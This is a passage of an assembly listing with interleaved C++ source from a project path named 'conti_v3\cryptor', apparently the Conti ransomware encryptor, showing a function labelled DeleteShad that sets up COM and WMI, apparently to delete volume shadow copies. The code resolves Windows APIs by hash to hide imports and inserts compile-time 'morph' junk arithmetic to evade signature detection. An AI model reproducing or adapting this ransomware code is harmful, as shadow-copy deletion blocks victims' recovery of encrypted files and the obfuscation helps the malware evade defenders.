; 826  : 	pFunction = (HRESULT(WINAPI*)(LPVOID, DWORD))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x499c819f, 39);//GetProcAddress(hOle32, OBFA("CoInitializeEx"));

  00024	ba 18 00 00 00	 mov	 edx, 24
  00029	41 b8 9f 81 9c
	49		 mov	 r8d, 1234993567		; 499c819fH
  0002f	44 8d 4a 0f	 lea	 r9d, QWORD PTR [rdx+15]
  00033	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 827  : 	return pFunction(pvReserved, dwCoInit);

  00038	33 d2		 xor	 edx, edx
  0003a	33 c9		 xor	 ecx, ecx
  0003c	ff d0		 call	 rax
  0003e	8b f8		 mov	 edi, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 68   : 	if (FAILED(hres))

  00040	85 c0		 test	 eax, eax
  00042	79 0a		 jns	 SHORT $LN4@DeleteShad

; 69   : 	{
; 70   : 		return FALSE;                  // Program has failed.

  00044	33 f6		 xor	 esi, esi
  00046	0f b7 c6	 movzx	 eax, si
  00049	e9 69 17 00 00	 jmp	 $LN1@DeleteShad
$LN4@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0004e	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$21[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00056	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0005b	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$21[rsp]
  0005f	f7 e9		 imul	 ecx
  00061	4c 89 bc 24 80
	0a 00 00	 mov	 QWORD PTR [rsp+2688], r15
  00069	8b c2		 mov	 eax, edx
  0006b	c1 e8 1f	 shr	 eax, 31
  0006e	03 d0		 add	 edx, eax
  00070	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00073	3b c8		 cmp	 ecx, eax
  00075	74 4b		 je	 SHORT $LN26@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00077	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$21[rsp]
  0007b	83 c1 02	 add	 ecx, 2
  0007e	03 cf		 add	 ecx, edi
  00080	89 4c 24 50	 mov	 DWORD PTR _morph_var$21[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00084	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$21[rsp]
  00088	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0008d	7d 07		 jge	 SHORT $LN1472@DeleteShad
  0008f	ff c8		 dec	 eax
  00091	83 c8 fc	 or	 eax, -4
  00094	ff c0		 inc	 eax
$LN1472@DeleteShad:
  00096	85 c0		 test	 eax, eax
  00098	75 79		 jne	 SHORT $LN25@DeleteShad
  0009a	66 0f 1f 44 00
	00		 npad	 6
$LL18@DeleteShad:
  000a0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$21[rsp]
  000a4	ff c0		 inc	 eax
  000a6	89 44 24 50	 mov	 DWORD PTR _morph_var$21[rsp], eax
  000aa	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$21[rsp]
  000ae	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  000b3	7d 07		 jge	 SHORT $LN1471@DeleteShad
  000b5	ff c8		 dec	 eax
  000b7	83 c8 fc	 or	 eax, -4
  000ba	ff c0		 inc	 eax
$LN1471@DeleteShad:
  000bc	85 c0		 test	 eax, eax
  000be	74 e0		 je	 SHORT $LL18@DeleteShad

; 51   : 	}

  000c0	eb 51		 jmp	 SHORT $LN25@DeleteShad
$LN26@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  000c2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$21[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  000c6	b9 02 00 00 00	 mov	 ecx, 2
  000cb	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$21[rsp]
  000cf	2b cf		 sub	 ecx, edi
  000d1	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000d3	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000d8	89 4c 24 50	 mov	 DWORD PTR _morph_var$21[rsp], ecx
  000dc	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$21[rsp]
  000e0	f7 e9		 imul	 ecx
  000e2	8b c2		 mov	 eax, edx
  000e4	c1 e8 1f	 shr	 eax, 31
  000e7	03 d0		 add	 edx, eax
  000e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000ec	3b c8		 cmp	 ecx, eax
  000ee	75 23		 jne	 SHORT $LN25@DeleteShad
$LL20@DeleteShad:
  000f0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$21[rsp]
  000f4	ff c0		 inc	 eax
  000f6	89 44 24 50	 mov	 DWORD PTR _morph_var$21[rsp], eax
  000fa	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000ff	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$21[rsp]
  00103	f7 e9		 imul	 ecx
  00105	8b c2		 mov	 eax, edx
  00107	c1 e8 1f	 shr	 eax, 31
  0010a	03 d0		 add	 edx, eax
  0010c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0010f	3b c8		 cmp	 ecx, eax
  00111	74 dd		 je	 SHORT $LL20@DeleteShad
$LN25@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 816  : 	pFunction = (HRESULT(WINAPI*)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xfaf3fba8, 40);//GetProcAddress(hOle32, OBFA("CoInitializeSecurity"));

  00113	ba 18 00 00 00	 mov	 edx, 24
  00118	41 b8 a8 fb f3
	fa		 mov	 r8d, -84673624		; faf3fba8H
  0011e	44 8d 4a 10	 lea	 r9d, QWORD PTR [rdx+16]
  00122	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 817  : 	return pFunction(pSecDesc, cAuthSvc, asAuthSvc, pReserved1, dwAuthnLevel, dwImpLevel, pAuthList, dwCapabilities, pReserved3);

  00127	33 f6		 xor	 esi, esi
  00129	41 bf 03 00 00
	00		 mov	 r15d, 3
  0012f	48 89 74 24 40	 mov	 QWORD PTR [rsp+64], rsi
  00134	45 33 c9	 xor	 r9d, r9d
  00137	89 74 24 38	 mov	 DWORD PTR [rsp+56], esi
  0013b	45 33 c0	 xor	 r8d, r8d
  0013e	48 89 74 24 30	 mov	 QWORD PTR [rsp+48], rsi
  00143	33 c9		 xor	 ecx, ecx
  00145	44 89 7c 24 28	 mov	 DWORD PTR [rsp+40], r15d
  0014a	8d 56 ff	 lea	 edx, QWORD PTR [rsi-1]
  0014d	89 74 24 20	 mov	 DWORD PTR [rsp+32], esi
  00151	ff d0		 call	 rax
  00153	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00156	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$20[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0015e	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$20[rsp]
  00162	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00167	f7 ef		 imul	 edi
  00169	8b ca		 mov	 ecx, edx
  0016b	c1 e9 1f	 shr	 ecx, 31
  0016e	03 d1		 add	 edx, ecx
  00170	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  00173	3b f9		 cmp	 edi, ecx
  00175	74 4b		 je	 SHORT $LN49@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00177	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$20[rsp]
  0017b	83 c1 02	 add	 ecx, 2
  0017e	41 03 c8	 add	 ecx, r8d
  00181	89 4c 24 50	 mov	 DWORD PTR _morph_var$20[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00185	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$20[rsp]
  00189	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0018e	7d 07		 jge	 SHORT $LN1469@DeleteShad
  00190	ff c8		 dec	 eax
  00192	83 c8 fc	 or	 eax, -4
  00195	ff c0		 inc	 eax
$LN1469@DeleteShad:
  00197	85 c0		 test	 eax, eax
  00199	75 79		 jne	 SHORT $LN48@DeleteShad
  0019b	0f 1f 44 00 00	 npad	 5
$LL41@DeleteShad:
  001a0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$20[rsp]
  001a4	ff c0		 inc	 eax
  001a6	89 44 24 50	 mov	 DWORD PTR _morph_var$20[rsp], eax
  001aa	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$20[rsp]
  001ae	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  001b3	7d 07		 jge	 SHORT $LN1468@DeleteShad
  001b5	ff c8		 dec	 eax
  001b7	83 c8 fc	 or	 eax, -4
  001ba	ff c0		 inc	 eax
$LN1468@DeleteShad:
  001bc	85 c0		 test	 eax, eax
  001be	74 e0		 je	 SHORT $LL41@DeleteShad

; 51   : 	}

  001c0	eb 52		 jmp	 SHORT $LN48@DeleteShad
$LN49@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  001c2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$20[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  001c6	b9 02 00 00 00	 mov	 ecx, 2
  001cb	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$20[rsp]
  001cf	41 2b c8	 sub	 ecx, r8d
  001d2	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  001d4	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001d9	89 4c 24 50	 mov	 DWORD PTR _morph_var$20[rsp], ecx
  001dd	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$20[rsp]
  001e1	f7 e9		 imul	 ecx
  001e3	8b c2		 mov	 eax, edx
  001e5	c1 e8 1f	 shr	 eax, 31
  001e8	03 d0		 add	 edx, eax
  001ea	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001ed	3b c8		 cmp	 ecx, eax
  001ef	75 23		 jne	 SHORT $LN48@DeleteShad
$LL43@DeleteShad:
  001f1	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$20[rsp]
  001f5	ff c0		 inc	 eax
  001f7	89 44 24 50	 mov	 DWORD PTR _morph_var$20[rsp], eax
  001fb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00200	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$20[rsp]
  00204	f7 e9		 imul	 ecx
  00206	8b c2		 mov	 eax, edx
  00208	c1 e8 1f	 shr	 eax, 31
  0020b	03 d0		 add	 edx, eax
  0020d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00210	3b c8		 cmp	 ecx, eax
  00212	74 dd		 je	 SHORT $LL43@DeleteShad
$LN48@DeleteShad:
  00214	4c 89 b4 24 78
	0a 00 00	 mov	 QWORD PTR [rsp+2680], r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 92   : 	if (FAILED(hres))

  0021c	ba 18 00 00 00	 mov	 edx, 24
  00221	45 85 c0	 test	 r8d, r8d
  00224	79 19		 jns	 SHORT $LN5@DeleteShad
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 770  : 	pFunction = (VOID(WINAPI*)())getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x68cc2bb5, 1);//GetProcAddress(hOle32, OBFA("CoUninitialize"));

  00226	44 8d 4a e9	 lea	 r9d, QWORD PTR [rdx-23]
  0022a	41 b8 b5 2b cc
	68		 mov	 r8d, 1758210997		; 68cc2bb5H
  00230	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 771  : 	return pFunction();

  00235	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 95   : 		return FALSE;                    // Program has failed.

  00237	0f b7 c6	 movzx	 eax, si
  0023a	e9 68 15 00 00	 jmp	 $LN1680@DeleteShad
$LN5@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 783  : 	pFunction = (HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x5abc5ed6, 42);//GetProcAddress(hOle32, OBFA("CoCreateInstance"));

  0023f	41 b9 2a 00 00
	00		 mov	 r9d, 42			; 0000002aH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 101  : 	IWbemLocator* pLoc = NULL;

  00245	48 89 b5 a8 00
	00 00		 mov	 QWORD PTR pLoc$[rbp-256], rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 783  : 	pFunction = (HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x5abc5ed6, 42);//GetProcAddress(hOle32, OBFA("CoCreateInstance"));

  0024c	41 b8 d6 5e bc
	5a		 mov	 r8d, 1522294486		; 5abc5ed6H
  00252	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 784  : 	return pFunction(rclsid, pUnkOuter, dwClsContext, riid, ppv);

  00257	48 8d 8d a8 00
	00 00		 lea	 rcx, QWORD PTR pLoc$[rbp-256]
  0025e	41 be 01 00 00
	00		 mov	 r14d, 1
  00264	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  00269	4c 8d 0d 00 00
	00 00		 lea	 r9, OFFSET FLAT:IID_IWbemLocator
  00270	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:CLSID_WbemLocator
  00277	45 8b c6	 mov	 r8d, r14d
  0027a	33 d2		 xor	 edx, edx
  0027c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0027e	89 7c 24 50	 mov	 DWORD PTR _morph_var$19[rsp], edi

; 48   : 	if (_morph_var % 3) {

  00282	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00287	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$19[rsp]
  0028b	f7 e9		 imul	 ecx
  0028d	8b c2		 mov	 eax, edx
  0028f	c1 e8 1f	 shr	 eax, 31
  00292	03 d0		 add	 edx, eax
  00294	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00297	3b c8		 cmp	 ecx, eax
  00299	74 57		 je	 SHORT $LN76@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  0029b	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$19[rsp]
  0029f	8b 85 a8 00 00
	00		 mov	 eax, DWORD PTR pLoc$[rbp-256]
  002a5	83 c0 02	 add	 eax, 2
  002a8	03 c8		 add	 ecx, eax
  002aa	89 4c 24 50	 mov	 DWORD PTR _morph_var$19[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  002ae	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$19[rsp]
  002b2	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  002b7	7d 07		 jge	 SHORT $LN1466@DeleteShad
  002b9	ff c8		 dec	 eax
  002bb	83 c8 fc	 or	 eax, -4
  002be	ff c0		 inc	 eax
$LN1466@DeleteShad:
  002c0	85 c0		 test	 eax, eax
  002c2	0f 85 8b 00 00
	00		 jne	 $LN75@DeleteShad
  002c8	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL68@DeleteShad:
  002d0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$19[rsp]
  002d4	ff c0		 inc	 eax
  002d6	89 44 24 50	 mov	 DWORD PTR _morph_var$19[rsp], eax
  002da	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$19[rsp]
  002de	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  002e3	7d 07		 jge	 SHORT $LN1465@DeleteShad
  002e5	ff c8		 dec	 eax
  002e7	83 c8 fc	 or	 eax, -4
  002ea	ff c0		 inc	 eax
$LN1465@DeleteShad:
  002ec	85 c0		 test	 eax, eax
  002ee	74 e0		 je	 SHORT $LL68@DeleteShad

; 51   : 	}

  002f0	eb 61		 jmp	 SHORT $LN75@DeleteShad
$LN76@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  002f2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$19[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  002f6	b9 02 00 00 00	 mov	 ecx, 2
  002fb	2b 8d a8 00 00
	00		 sub	 ecx, DWORD PTR pLoc$[rbp-256]
  00301	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$19[rsp]
  00305	03 c1		 add	 eax, ecx
  00307	89 44 24 50	 mov	 DWORD PTR _morph_var$19[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0030b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00310	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$19[rsp]
  00314	f7 e9		 imul	 ecx
  00316	8b c2		 mov	 eax, edx
  00318	c1 e8 1f	 shr	 eax, 31
  0031b	03 d0		 add	 edx, eax
  0031d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00320	3b c8		 cmp	 ecx, eax
  00322	75 2f		 jne	 SHORT $LN75@DeleteShad
  00324	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL70@DeleteShad:
  00330	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$19[rsp]
  00334	ff c0		 inc	 eax
  00336	89 44 24 50	 mov	 DWORD PTR _morph_var$19[rsp], eax
  0033a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0033f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$19[rsp]
  00343	f7 e9		 imul	 ecx
  00345	8b c2		 mov	 eax, edx
  00347	c1 e8 1f	 shr	 eax, 31
  0034a	03 d0		 add	 edx, eax
  0034c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0034f	3b c8		 cmp	 ecx, eax
  00351	74 dd		 je	 SHORT $LL70@DeleteShad
$LN75@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 237  : 	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xde1467b1, 90);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));

  00353	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 110  : 	IWbemContext* pContext = NULL;

  00358	48 89 b5 c0 00
	00 00		 mov	 QWORD PTR pContext$[rbp-256], rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 237  : 	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xde1467b1, 90);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));

  0035f	41 b8 b1 67 14
	de		 mov	 r8d, -569088079		; de1467b1H
  00365	44 8d 4a 4b	 lea	 r9d, QWORD PTR [rdx+75]
  00369	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 238  : 	return pFunction(lpSystemInfo);

  0036e	48 8d 8d 08 01
	00 00		 lea	 rcx, QWORD PTR SysInfo$[rbp-256]
  00375	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00377	89 7c 24 50	 mov	 DWORD PTR _morph_var$18[rsp], edi

; 48   : 	if (_morph_var % 3) {

  0037b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00380	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$18[rsp]
  00384	f7 e9		 imul	 ecx
  00386	8b c2		 mov	 eax, edx
  00388	c1 e8 1f	 shr	 eax, 31
  0038b	03 d0		 add	 edx, eax
  0038d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00390	3b c8		 cmp	 ecx, eax
  00392	74 4f		 je	 SHORT $LN99@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00394	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$18[rsp]
  00398	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR SysInfo$[rbp-232]
  0039e	83 c0 02	 add	 eax, 2
  003a1	03 c8		 add	 ecx, eax
  003a3	89 4c 24 50	 mov	 DWORD PTR _morph_var$18[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  003a7	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$18[rsp]
  003ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003b0	7d 07		 jge	 SHORT $LN1463@DeleteShad
  003b2	ff c8		 dec	 eax
  003b4	83 c8 fc	 or	 eax, -4
  003b7	ff c0		 inc	 eax
$LN1463@DeleteShad:
  003b9	85 c0		 test	 eax, eax
  003bb	0f 85 82 00 00
	00		 jne	 $LN98@DeleteShad
$LL91@DeleteShad:
  003c1	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$18[rsp]
  003c5	ff c0		 inc	 eax
  003c7	89 44 24 50	 mov	 DWORD PTR _morph_var$18[rsp], eax
  003cb	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$18[rsp]
  003cf	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003d4	7d 07		 jge	 SHORT $LN1462@DeleteShad
  003d6	ff c8		 dec	 eax
  003d8	83 c8 fc	 or	 eax, -4
  003db	ff c0		 inc	 eax
$LN1462@DeleteShad:
  003dd	85 c0		 test	 eax, eax
  003df	74 e0		 je	 SHORT $LL91@DeleteShad

; 51   : 	}

  003e1	eb 60		 jmp	 SHORT $LN98@DeleteShad
$LN99@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  003e3	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$18[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  003e7	b9 02 00 00 00	 mov	 ecx, 2
  003ec	2b 8d 20 01 00
	00		 sub	 ecx, DWORD PTR SysInfo$[rbp-232]
  003f2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$18[rsp]
  003f6	03 c1		 add	 eax, ecx
  003f8	89 44 24 50	 mov	 DWORD PTR _morph_var$18[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  003fc	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00401	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$18[rsp]
  00405	f7 e9		 imul	 ecx
  00407	8b c2		 mov	 eax, edx
  00409	c1 e8 1f	 shr	 eax, 31
  0040c	03 d0		 add	 edx, eax
  0040e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00411	3b c8		 cmp	 ecx, eax
  00413	75 2e		 jne	 SHORT $LN98@DeleteShad
  00415	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL93@DeleteShad:
  00420	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$18[rsp]
  00424	ff c0		 inc	 eax
  00426	89 44 24 50	 mov	 DWORD PTR _morph_var$18[rsp], eax
  0042a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0042f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$18[rsp]
  00433	f7 e9		 imul	 ecx
  00435	8b c2		 mov	 eax, edx
  00437	c1 e8 1f	 shr	 eax, 31
  0043a	03 d0		 add	 edx, eax
  0043c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0043f	3b c8		 cmp	 ecx, eax
  00441	74 dd		 je	 SHORT $LL93@DeleteShad
$LN98@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 116  : 	if (SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {

  00443	66 83 bd 08 01
	00 00 09	 cmp	 WORD PTR SysInfo$[rbp-256], 9
  0044b	48 89 9c 24 70
	0a 00 00	 mov	 QWORD PTR [rsp+2672], rbx
  00453	0f 85 5f 03 00
	00		 jne	 $LN8@DeleteShad
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 783  : 	pFunction = (HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x5abc5ed6, 42);//GetProcAddress(hOle32, OBFA("CoCreateInstance"));

  00459	ba 18 00 00 00	 mov	 edx, 24
  0045e	41 b8 d6 5e bc
	5a		 mov	 r8d, 1522294486		; 5abc5ed6H
  00464	44 8d 4a 12	 lea	 r9d, QWORD PTR [rdx+18]
  00468	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 784  : 	return pFunction(rclsid, pUnkOuter, dwClsContext, riid, ppv);

  0046d	48 8d 8d c0 00
	00 00		 lea	 rcx, QWORD PTR pContext$[rbp-256]
  00474	45 8b c6	 mov	 r8d, r14d
  00477	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  0047c	4c 8d 0d 00 00
	00 00		 lea	 r9, OFFSET FLAT:IID_IWbemContext
  00483	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:CLSID_WbemContext
  0048a	33 d2		 xor	 edx, edx
  0048c	ff d0		 call	 rax
  0048e	8b f8		 mov	 edi, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 119  : 		if (FAILED(hres))

  00490	85 c0		 test	 eax, eax
  00492	0f 88 5b 06 00
	00		 js	 $LN1684@DeleteShad
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00498	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$13[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  004a0	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004a5	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$13[rsp]
  004a9	f7 e9		 imul	 ecx
  004ab	8b c2		 mov	 eax, edx
  004ad	c1 e8 1f	 shr	 eax, 31
  004b0	03 d0		 add	 edx, eax
  004b2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004b5	3b c8		 cmp	 ecx, eax
  004b7	74 49		 je	 SHORT $LN837@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  004b9	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$13[rsp]
  004bd	83 c1 02	 add	 ecx, 2
  004c0	03 cf		 add	 ecx, edi
  004c2	89 4c 24 50	 mov	 DWORD PTR _morph_var$13[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  004c6	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$13[rsp]
  004ca	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  004cf	7d 07		 jge	 SHORT $LN1460@DeleteShad
  004d1	ff c8		 dec	 eax
  004d3	83 c8 fc	 or	 eax, -4
  004d6	ff c0		 inc	 eax
$LN1460@DeleteShad:
  004d8	85 c0		 test	 eax, eax
  004da	75 77		 jne	 SHORT $LN836@DeleteShad
  004dc	0f 1f 40 00	 npad	 4
$LL829@DeleteShad:
  004e0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$13[rsp]
  004e4	ff c0		 inc	 eax
  004e6	89 44 24 50	 mov	 DWORD PTR _morph_var$13[rsp], eax
  004ea	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$13[rsp]
  004ee	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  004f3	7d 07		 jge	 SHORT $LN1459@DeleteShad
  004f5	ff c8		 dec	 eax
  004f7	83 c8 fc	 or	 eax, -4
  004fa	ff c0		 inc	 eax
$LN1459@DeleteShad:
  004fc	85 c0		 test	 eax, eax
  004fe	74 e0		 je	 SHORT $LL829@DeleteShad

; 51   : 	}

  00500	eb 51		 jmp	 SHORT $LN836@DeleteShad
$LN837@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

